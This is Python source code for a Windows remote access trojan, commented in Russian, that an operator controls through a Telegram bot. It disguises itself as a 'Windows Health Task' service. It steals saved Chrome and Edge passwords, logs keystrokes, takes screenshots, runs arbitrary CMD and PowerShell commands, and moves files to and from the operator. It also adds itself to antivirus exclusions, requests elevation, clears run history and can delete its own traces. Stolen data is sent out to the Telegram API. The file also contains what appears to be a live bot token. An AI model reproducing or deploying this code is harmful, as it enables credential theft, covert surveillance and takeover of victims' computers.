#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows Health Service (Telegram RAT)
Версия: 3.0 Final
Описание: Бесшумная служба Windows с управлением через Telegram (инлайн-кнопки).
Функции: инфа о системе, скриншот, пароли браузеров, кейлоггер, выполнение CMD/PowerShell,
         работа с файлами (просмотр/скачивание/загрузка), очистка истории RunMRU для всех пользователей,
         полное самоуничтожение (Nuke). Добавление в исключения антивирусов (Касперский, 360 TS).
Автор: AOIRUSRA Research Framework
"""

import os
import sys
import time
import threading
import tempfile
import shutil
import subprocess
import zipfile
import json
import ctypes
import logging
import sqlite3
from datetime import datetime

import requests
import winreg
import win32api
import win32con
import win32event
import win32service
import win32serviceutil
import win32process
import servicemanager
from win32crypt import CryptUnprotectData

# ====================== КОНФИГУРАЦИЯ (замени на свои) ======================
TOKEN = "8673143975:AAGLd504Zyi8ThRbeYJ0FASG3XO-wTrHqrQ"
CHAT_ID = "8483538062"          # числовой или строка с ID
SERVICE_NAME = "WindowsHealthTask"
SERVICE_DISPLAY = "Windows Health Task Service"
SERVICE_DESC = "Мониторинг системных ресурсов и обновлений."
# Папка для хранения временных данных
WORK_DIR = os.path.join(os.environ.get("APPDATA", tempfile.gettempdir()),
                        "Microsoft", "Windows")
LOG_FILE = None
# ===========================================================================

# -------- Глобальный логгер (пишет только в файл, если нужно) -----------
def setup_logger():
    global LOG_FILE
    LOG_FILE = os.path.join(WORK_DIR, "system.log")
    os.makedirs(WORK_DIR, exist_ok=True)
    logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                        format="%(asctime)s - %(message)s",
                        datefmt="%Y-%m-%d %H:%M:%S")

def log(msg):
    try:
        logging.info(msg)
    except:
        pass

# -------- Вспомогательные функции Telegram ----------
def send_message(text, parse_mode='HTML', reply_markup=None):
    """Отправить сообщение в чат. Возвращает message_id или None."""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True,
        "reply_markup": reply_markup
    }
    try:
        r = requests.post(url, json=payload, timeout=15)
        return r.json().get("result", {}).get("message_id")
    except Exception as e:
        log(f"sendMessage error: {e}")
        return None

def edit_message_text(message_id, text, reply_markup=None):
    """Изменить существующее сообщение (для меню)."""
    url = f"https://api.telegram.org/bot{TOKEN}/editMessageText"
    payload = {
        "chat_id": CHAT_ID,
        "message_id": message_id,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
        "reply_markup": reply_markup
    }
    try:
        requests.post(url, json=payload, timeout=15)
    except Exception as e:
        log(f"editMessageText error: {e}")

def answer_callback(callback_id):
    """Подтвердить нажатие кнопки (убрать залипание)."""
    url = f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery"
    try:
        requests.post(url, json={"callback_query_id": callback_id}, timeout=5)
    except:
        pass

def send_file(file_path):
    """Отправить файл как документ."""
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            files = {'document': (os.path.basename(file_path), f)}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data, timeout=30)
    except Exception as e:
        log(f"sendFile error: {e}")

# -------- Утилиты системы ----------
def is_admin():
    """Проверка прав администратора."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def run_hidden(cmd):
    """Выполнить команду без окон, вернуть (stdout, stderr, returncode)."""
    try:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        out, err = proc.communicate(timeout=30)
        return out, err, proc.returncode
    except Exception as e:
        return "", str(e), -1

# -------- Функция добавления в исключения антивирусов ----------
def add_to_av_exclusions(path):
    """
    Пытается тихо добавить папку в исключения Касперского и 360 Total Security.
    Никаких окон, ошибки игнорируются.
    """
    # Касперский: ищем avp.com
    kav_paths = [
        r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Free 21.3\avp.com",
        r"C:\Program Files\Kaspersky Lab\Kaspersky Free 21.3\avp.com",
        r"C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security 2015\avp.com",
        r"C:\Program Files\Kaspersky Lab\Kaspersky Internet Security 2015\avp.com",
        # Можно добавить другие возможные пути
    ]
    for p in kav_paths:
        if os.path.exists(p):
            try:
                cmd = f'"{p}" ADD_EXCLUSION "{path}" /type=folder'
                subprocess.run(cmd, shell=True, capture_output=True,
                               timeout=10, creationflags=subprocess.CREATE_NO_WINDOW)
                log(f"Added to Kaspersky exclusions: {path}")
            except:
                pass
            break

    # 360 Total Security: проверяем наличие процесса 360tray.exe и пробуем через реестр
    # У 360 есть undocumented параметры, но проще через GUI – оставим заглушку.
    # В коде можно просто попытаться записать в HKCU\Software\360Safe\... но это ненадёжно.
    # Пока оставим: если найден процесс, ничего не делаем (пусть обфускация спасает).
    out, _, _ = run_hidden('tasklist /fi "imagename eq 360tray.exe" /fo csv /nh')
    if out and "360tray.exe" in out:
        log("360 Total Security detected, but exclusion not supported silently.")
        # Не делаем ничего, чтобы не вызвать ошибок.
    # Альтернативно можно попробовать: в реестре HKLM\SOFTWARE\360TotalSecurity\...
    # Но без тестирования рискованно.

    # Windows Defender (если вдруг включен на Win7)
    # можно через powershell: Add-MpPreference -ExclusionPath, но на Win7 его нет.
    # Пропускаем.

# -------- Очистка истории Win+R для ВСЕХ пользователей ----------
def clear_run_history_all_users():
    """Загружает кусты реестра пользователей и удаляет RunMRU ключ."""
    cleared = 0
    users_dir = r"C:\Users"
    if not os.path.exists(users_dir):
        return "Папка Users не найдена."
    for user in os.listdir(users_dir):
        ntuser = os.path.join(users_dir, user, "NTUSER.DAT")
        if not os.path.exists(ntuser):
            continue
        hive_name = f"TEMP_HIVE_{int(time.time())}"
        try:
            # Загружаем куст
            subprocess.run(
                f'reg load "HKU\\{hive_name}" "{ntuser}"',
                shell=True, capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=10
            )
            # Удаляем ключ RunMRU
            subprocess.run(
                f'reg delete "HKU\\{hive_name}\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f',
                shell=True, capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=10
            )
            # Выгружаем куст
            subprocess.run(
                f'reg unload "HKU\\{hive_name}"',
                shell=True, capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=10
            )
            cleared += 1
        except:
            # Пытаемся выгрузить в любом случае
            try:
                subprocess.run(f'reg unload "HKU\\{hive_name}"', shell=True,
                               capture_output=True,
                               creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
    return f"История RunMRU очищена у {cleared} пользователей."

# -------- Сбор информации о системе ----------
def get_system_info():
    try:
        host = os.environ.get('COMPUTERNAME', 'PC')
        # Публичный IP
        ip = "N/A"
        try:
            r = requests.get("https://api.ipify.org?format=json", timeout=5)
            ip = r.json().get("ip", "N/A")
        except:
            pass
        # Версия Windows через win32api
        ver = win32api.GetVersionEx()
        win_ver = f"{ver[0]}.{ver[1]}.{ver[2]} (build {ver[3]})"
        # Текущий пользователь (активная сессия)
        user = os.getlogin()
        # Тип сессии
        is_system = user.upper() == "SYSTEM"
        info = (
            f"💻 <b>Хост:</b> {host}\n"
            f"🌐 <b>IP:</b> {ip}\n"
            f"👤 <b>Пользователь:</b> {user}\n"
            f"🪟 <b>ОС:</b> {win_ver}\n"
            f"🔐 <b>Привилегии:</b> {'SYSTEM' if is_system else 'Admin' if is_admin() else 'User'}"
        )
        return info
    except Exception as e:
        return f"Ошибка при сборе информации: {e}"

# -------- Скриншот ----------
def make_screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        path = os.path.join(tempfile.gettempdir(), f"screen_{int(time.time())}.png")
        img.save(path)
        return path
    except ImportError:
        # Резервный метод через PowerShell
        ps_cmd = (
            "Add-Type -AssemblyName System.Windows.Forms; "
            "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; "
            "$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; "
            "$graphics = [System.Drawing.Graphics]::FromImage($bitmap); "
            "$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); "
            "$bitmap.Save('$env:TEMP\\screen_ps.png'); "
            "echo $env:TEMP\\screen_ps.png"
        )
        out, _, _ = run_hidden(f'powershell -WindowStyle Hidden -Command "{ps_cmd}"')
        # Ищем путь в выводе
        for line in out.splitlines():
            if "screen_ps.png" in line:
                return line.strip()
        return None
    except Exception as e:
        log(f"Screenshot error: {e}")
        return None

# -------- Кейлоггер ----------
keylog_running = False
keylog_lock = threading.Lock()

def keylogger_thread():
    global keylog_running
    user32 = ctypes.windll.user32
    GetAsyncKeyState = user32.GetAsyncKeyState
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextW = user32.GetWindowTextW
    prev_window = None
    keylog_path = os.path.join(WORK_DIR, "klog.txt")
    with open(keylog_path, 'a', encoding='utf-8') as f:
        while keylog_running:
            for i in range(8, 255):
                if GetAsyncKeyState(i) & 0x0001:
                    hwnd = GetForegroundWindow()
                    buf = ctypes.create_unicode_buffer(512)
                    GetWindowTextW(hwnd, buf, 512)
                    title = buf.value if buf.value else "Unknown"
                    if hwnd != prev_window:
                        f.write(f"\n[{datetime.now().strftime('%H:%M:%S')} - {title}]\n")
                        prev_window = hwnd
                    # Перевод кода в символ (приблизительно)
                    if 32 <= i <= 126:    # Печатные символы
                        char = chr(i)
                    elif i == 8:
                        char = "[BS]"
                    elif i == 13:
                        char = "[ENTER]\n"
                    elif i == 9:
                        char = "[TAB]"
                    elif i == 27:
                        char = "[ESC]"
                    elif i == 32:
                        char = " "
                    else:
                        char = f"[{i}]"
                    f.write(char)
                    f.flush()
            time.sleep(0.02)
    log("Keylogger stopped.")

def start_keylog():
    global keylog_running
    with keylog_lock:
        if not keylog_running:
            keylog_running = True
            threading.Thread(target=keylogger_thread, daemon=True).start()
            return "Кейлоггер запущен."
        return "Кейлоггер уже активен."

def stop_keylog():
    global keylog_running
    with keylog_lock:
        if keylog_running:
            keylog_running = False
            return "Кейлоггер остановлен."
        return "Кейлоггер не был запущен."

def send_keylog():
    path = os.path.join(WORK_DIR, "klog.txt")
    if os.path.exists(path) and os.path.getsize(path) > 0:
        send_file(path)
        return "Файл лога отправлен."
    return "Лог-файл пуст или не существует."

# -------- Пароли браузеров (Chrome, Edge) ----------
def steal_passwords():
    """
    Собирает сохранённые пароли из Chrome/Edge текущего пользователя.
    Работает только если процесс запущен в контексте того же пользователя,
    что и браузер (не SYSTEM).
    """
    if os.getlogin().upper() == "SYSTEM":
        return "⚠️ Функция кражи паролей недоступна из-под SYSTEM. Запустите RAT в пользовательском режиме."

    browsers = {
        "Chrome": os.path.join(os.environ.get("LOCALAPPDATA", ""),
                               "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ.get("LOCALAPPDATA", ""),
                             "Microsoft", "Edge", "User Data"),
    }
    found = []
    for name, base_dir in browsers.items():
        if not os.path.exists(base_dir):
            continue
        for profile in os.listdir(base_dir):
            login_db = os.path.join(base_dir, profile, "Login Data")
            if not os.path.exists(login_db):
                continue
            tmp = tempfile.mktemp(suffix=".db")
            try:
                shutil.copy2(login_db, tmp)
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, enc_pwd in cursor.fetchall():
                    if not user or not enc_pwd:
                        continue
                    # Расшифровка DPAPI
                    try:
                        pwd = CryptUnprotectData(enc_pwd, None, None, None, 0)[1].decode('utf-8')
                    except:
                        pwd = "<не расшифровано>"
                    found.append(f"{url} | {user} | {pwd}")
                conn.close()
            except Exception as e:
                log(f"Password extraction error {name}: {e}")
            finally:
                if os.path.exists(tmp):
                    os.remove(tmp)
    if found:
        out_path = os.path.join(WORK_DIR, "passwords.txt")
        with open(out_path, 'w', encoding='utf-8') as f:
            f.write("\n".join(found))
        send_file(out_path)
        return f"Найдено {len(found)} записей. Отправлено."
    else:
        return "Паролей не найдено или браузеры не установлены."

# -------- Файловые операции ----------
def list_directory(path):
    """Содержимое папки (папки + файлы)."""
    if not os.path.exists(path):
        return f"Путь не найден: {path}"
    try:
        items = os.listdir(path)
        dirs = [d + "/" for d in items if os.path.isdir(os.path.join(path, d))]
        files = [f for f in items if os.path.isfile(os.path.join(path, f))]
        result = "📁 Папки:\n" + ("\n".join(dirs) if dirs else "(нет)") + "\n\n📄 Файлы:\n" + ("\n".join(files) if files else "(нет)")
        if len(result) > 4000:
            # Если слишком много, отправляем файлом
            out_path = os.path.join(tempfile.gettempdir(), f"dirlist_{int(time.time())}.txt")
            with open(out_path, 'w', encoding='utf-8') as f:
                f.write(result)
            send_file(out_path)
            os.remove(out_path)
            return "Содержимое папки отправлено файлом (слишком длинный список)."
        return result
    except Exception as e:
        return f"Ошибка: {e}"

def tree_directory(path):
    """Рекурсивный список всех папок."""
    if not os.path.exists(path):
        return f"Путь не найден: {path}"
    try:
        result = []
        for root, dirs, _ in os.walk(path):
            for d in dirs:
                result.append(os.path.join(root, d))
        if not result:
            return "Вложенных папок нет."
        text = "\n".join(result)
        if len(text) > 4000:
            out_path = os.path.join(tempfile.gettempdir(), f"tree_{int(time.time())}.txt")
            with open(out_path, 'w', encoding='utf-8') as f:
                f.write(text)
            send_file(out_path)
            os.remove(out_path)
            return "Дерево папок отправлено файлом."
        return text
    except Exception as e:
        return f"Ошибка: {e}"

def download_file(file_path):
    if not os.path.exists(file_path):
        return f"Файл не найден: {file_path}"
    if os.path.getsize(file_path) > 50 * 1024 * 1024:
        return "Файл больше 50 МБ, отправка невозможна."
    send_file(file_path)
    return f"Файл {os.path.basename(file_path)} отправлен."

def upload_file(file_id, file_name):
    """Скачивает присланный боту файл и сохраняет в WORK_DIR."""
    try:
        # Получаем информацию о файле
        url = f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}"
        r = requests.get(url, timeout=10).json()
        file_path = r["result"]["file_path"]
        file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path}"
        content = requests.get(file_url).content
        dest = os.path.join(WORK_DIR, file_name)
        with open(dest, 'wb') as f:
            f.write(content)
        return f"Файл сохранён как {dest}"
    except Exception as e:
        return f"Ошибка загрузки файла: {e}"

# -------- Выполнение команд ----------
def execute_cmd(command):
    out, err, code = run_hidden(command)
    reply = f"<b>CMD выполнила:</b> <pre>{command}</pre>\n"
    if out:
        reply += f"<b>Вывод:</b>\n<pre>{out[:2000]}</pre>\n"
    if err:
        reply += f"<b>Ошибки:</b>\n<pre>{err[:1000]}</pre>\n"
    reply += f"<b>Код возврата:</b> {code}"
    return reply

def execute_ps(script):
    cmd = f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "{script}"'
    return execute_cmd(cmd)

# -------- Самоликвидация ----------
def self_nuke(service_mode=True):
    """
    Полное удаление всех следов.
    """
    log("Nuke initiated.")
    send_message("☠️ <b>Запущена самоликвидация...</b>")

    # 1. Остановить и удалить службу
    if service_mode and is_admin():
        run_hidden(f'sc stop "{SERVICE_NAME}"')
        time.sleep(2)
        run_hidden(f'sc delete "{SERVICE_NAME}"')
        log("Service removed.")

    # 2. Удалить рабочую папку
    try:
        if os.path.exists(WORK_DIR):
            shutil.rmtree(WORK_DIR, ignore_errors=True)
            log("Work directory deleted.")
    except:
        pass

    # 3. Очистить историю RunMRU у всех пользователей
    clear_run_history_all_users()

    # 4. Удалить из автозагрузки реестра (если использовалась)
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, SERVICE_NAME)
    except:
        pass

    # 5. Удалить сам исполняемый файл
    exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
    bat_content = f'''@echo off
timeout /t 3 /nobreak >nul
del /f /q "{exe_path}"
del /f /q "%~f0"
'''
    bat_path = os.path.join(tempfile.gettempdir(), f"cleanup_{int(time.time())}.bat")
    with open(bat_path, 'w') as f:
        f.write(bat_content)
    subprocess.Popen(bat_path, shell=True,
                     creationflags=subprocess.CREATE_NO_WINDOW,
                     close_fds=True)
    log("Self-deletion bat created.")

    # 6. Финальное сообщение (может не успеть отправиться)
    send_message("💀 <b>Всё чисто. Прощай.</b>")
    time.sleep(1)
    # Принудительно выходим
    os._exit(0)

# ================== КЛАВИАТУРЫ (Inline Keyboard) ==================
def build_main_menu():
    keyboard = [
        [
            {"text": "💻 Инфо", "callback_data": "info"},
            {"text": "📁 Файлы", "callback_data": "files"}
        ],
        [
            {"text": "📸 Скрин", "callback_data": "screen"},
            {"text": "🔑 Пароли", "callback_data": "passwords"}
        ],
        [
            {"text": "⌨️ Кейлог", "callback_data": "keylog_menu"},
            {"text": "⚡ CMD", "callback_data": "cmd"}
        ],
        [
            {"text": "📋 PS", "callback_data": "ps"},
            {"text": "🧹 Очистить Run", "callback_data": "clearrun"}
        ],
        [
            {"text": "☠️ Nuke", "callback_data": "nuke"}
        ]
    ]
    return {"inline_keyboard": keyboard}

def build_files_menu():
    return {"inline_keyboard": [
        [{"text": "📥 Скачать", "callback_data": "download"},
         {"text": "📤 Загрузить", "callback_data": "upload"}],
        [{"text": "📂 Сканировать", "callback_data": "scan"},
         {"text": "🌲 Дерево", "callback_data": "tree"}],
        [{"text": "🔙 Назад", "callback_data": "back_main"}]
    ]}

def build_keylog_menu():
    return {"inline_keyboard": [
        [{"text": "▶️ Старт", "callback_data": "keylog_start"},
         {"text": "⏹️ Стоп", "callback_data": "keylog_stop"},
         {"text": "📨 Отправить", "callback_data": "keylog_send"}],
        [{"text": "🔙 Назад", "callback_data": "back_main"}]
    ]}

# ------------------- Обработка команд и callback -------------------
class SessionState:
    """Сохраняет состояние диалога (ожидание ввода пути)."""
    def __init__(self):
        self.awaiting_input = None  # например "scan_input"
        self.last_menu_message_id = None

state = SessionState()

def process_update(update):
    """Главный диспетчер обновлений."""
    # Callback query (нажатие кнопки)
    if "callback_query" in update:
        cb = update["callback_query"]
        data = cb["data"]
        msg = cb.get("message")
        chat_id = str(msg.get("chat", {}).get("id", ""))
        if chat_id != str(CHAT_ID):
            return
        answer_callback(cb["id"])   # убираем часы на кнопке

        # Обработчики
        if data == "info":
            info = get_system_info()
            send_message(info)
        elif data == "screen":
            send_message("Делаю скриншот...")
            screen_path = make_screenshot()
            if screen_path and os.path.exists(screen_path):
                send_file(screen_path)
                os.remove(screen_path)
            else:
                send_message("Не удалось сделать скриншот.")
        elif data == "passwords":
            send_message("Ищу пароли...")
            result = steal_passwords()
            send_message(result)
        elif data == "clearrun":
            result = clear_run_history_all_users()
            send_message(result)
        elif data == "nuke":
            # Запускаем в отдельном потоке, чтобы ответить на callback
            threading.Thread(target=self_nuke, args=(True,), daemon=True).start()
        elif data == "files":
            state.last_menu_message_id = send_message("📁 <b>Файловые операции</b>", reply_markup=build_files_menu())
        elif data == "back_main":
            state.last_menu_message_id = send_message("📋 <b>Главное меню</b>", reply_markup=build_main_menu())
        elif data == "keylog_menu":
            state.last_menu_message_id = send_message("⌨️ <b>Кейлоггер</b>", reply_markup=build_keylog_menu())
        elif data == "keylog_start":
            send_message(start_keylog())
        elif data == "keylog_stop":
            send_message(stop_keylog())
        elif data == "keylog_send":
            send_message(send_keylog())
        elif data == "cmd":
            state.awaiting_input = "cmd_input"
            send_message("Введите команду CMD текстом:")
        elif data == "ps":
            state.awaiting_input = "ps_input"
            send_message("Введите код PowerShell текстом:")
        elif data == "scan":
            state.awaiting_input = "scan_input"
            send_message("Введите путь для сканирования:")
        elif data == "tree":
            state.awaiting_input = "tree_input"
            send_message("Введите корневую папку для дерева:")
        elif data == "download":
            state.awaiting_input = "download_input"
            send_message("Введите полный путь к файлу для скачивания:")
        elif data == "upload":
            state.awaiting_input = None
            send_message("Отправьте мне файл, и я сохраню его в рабочей папке.")

    # Обычное сообщение
    elif "message" in update:
        msg = update["message"]
        chat_id = str(msg.get("chat", {}).get("id", ""))
        if chat_id != str(CHAT_ID):
            return

        text = msg.get("text", "").strip()
        document = msg.get("document")

        # Если ожидается ввод текста (после нажатия кнопок)
        if text and state.awaiting_input:
            if state.awaiting_input == "cmd_input":
                reply = execute_cmd(text)
                send_message(reply, parse_mode='HTML')
            elif state.awaiting_input == "ps_input":
                reply = execute_ps(text)
                send_message(reply, parse_mode='HTML')
            elif state.awaiting_input == "scan_input":
                reply = list_directory(text)
                send_message(reply, parse_mode='HTML')
            elif state.awaiting_input == "tree_input":
                reply = tree_directory(text)
                send_message(reply, parse_mode='HTML')
            elif state.awaiting_input == "download_input":
                reply = download_file(text)
                send_message(reply)
            state.awaiting_input = None
            return

        # Обработка загруженного файла (для upload)
        if document:
            file_id = document["file_id"]
            file_name = document.get("file_name", "unknown_file")
            result = upload_file(file_id, file_name)
            send_message(result)
            return

        # Обычные текстовые команды (запасной вариант)
        if text == "/start":
            state.last_menu_message_id = send_message(
                "📋 <b>Главное меню</b>",
                reply_markup=build_main_menu()
            )
        else:
            send_message("Неизвестная команда. Используйте /start для меню.")

# ================== КЛАСС СЛУЖБЫ ==================
class RatService(win32serviceutil.ServiceFramework):
    _svc_name_ = SERVICE_NAME
    _svc_display_name_ = SERVICE_DISPLAY
    _svc_description_ = SERVICE_DESC

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        log("Service stop requested.")

    def SvcDoRun(self):
        servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
                              servicemanager.PYS_SERVICE_STARTED,
                              (self._svc_name_, ''))
        setup_logger()
        log("Service started.")
        send_message("✅ <b>Служба запущена.</b>")
        send_message(get_system_info(), parse_mode='HTML')

        # Главный цикл с long polling
        last_update = 0
        while True:
            # Проверка на сигнал остановки
            if win32event.WaitForSingleObject(self.hWaitStop, 2000) == win32event.WAIT_OBJECT_0:
                log("Stopping main loop.")
                break

            url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_update+1}&timeout=30"
            try:
                r = requests.get(url, timeout=35).json()
                if not r.get("ok"):
                    continue
                for upd in r["result"]:
                    last_update = upd["update_id"]
                    process_update(upd)
            except Exception as e:
                log(f"Main loop error: {e}")
                time.sleep(5)
        # Конец службы
        send_message("⚠️ Служба остановлена.")

# ================== УСТАНОВКА ==================
def install_as_service():
    """Копирует exe в WORK_DIR и создаёт службу."""
    exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
    dest_dir = WORK_DIR
    os.makedirs(dest_dir, exist_ok=True)
    dest_path = os.path.join(dest_dir, os.path.basename(exe_path))
    try:
        shutil.copy2(exe_path, dest_path)
        log(f"Copied to {dest_path}")
    except Exception as e:
        log(f"Copy error: {e}")
        return False

    # Добавить папку в исключения антивирусов
    add_to_av_exclusions(dest_dir)

    # Установить службу
    cmd_install = f'sc create "{SERVICE_NAME}" binPath= "\\"{dest_path}\\" --service" start= auto'
    out, err, code = run_hidden(cmd_install)
    if code == 0 or "already exists" in err:
        # Запустить службу
        run_hidden(f'sc start "{SERVICE_NAME}"')
        log("Service installed and started.")
        send_message("✅ Служба успешно установлена и запущена.")
        return True
    else:
        log(f"Failed to install service: {out} {err}")
        return False

# ================== ТОЧКА ВХОДА ==================
if __name__ == "__main__":
    # Если запущен с аргументом --service, значит нас вызвал SCM
    if len(sys.argv) >= 2 and sys.argv[1] == "--service":
        # Запуск как служба
        win32serviceutil.HandleCommandLine(RatService)
    else:
        # Режим установки или обычный запуск
        setup_logger()
        log("Starting installation/standalone mode.")
        if not is_admin():
            # Попытаться получить права администратора
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable,
                " ".join(sys.argv), None, 1
            )
            sys.exit(0)
        else:
            # Уже администратор – устанавливаем службу
            success = install_as_service()
            if success:
                # Очистить RunMRU у всех
                clear_run_history_all_users()
                log("Installation completed.")
                # Завершаемся (служба уже работает)
                sys.exit(0)
            else:
                # Не удалось – запускаем в пользовательском режиме с кнопками
                log("Falling back to user mode.")
                send_message("⚠️ Не удалось установить службу. Работаю в режиме пользователя.")
                # Запускаем главный цикл прямо здесь
                last_update = 0
                while True:
                    try:
                        r = requests.get(
                            f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_update+1}&timeout=30",
                            timeout=35
                        ).json()
                        if r.get("ok"):
                            for upd in r["result"]:
                                last_update = upd["update_id"]
                                process_update(upd)
                    except KeyboardInterrupt:
                        break
                    except Exception as e:
                        log(f"User-mode loop error: {e}")
                        time.sleep(5)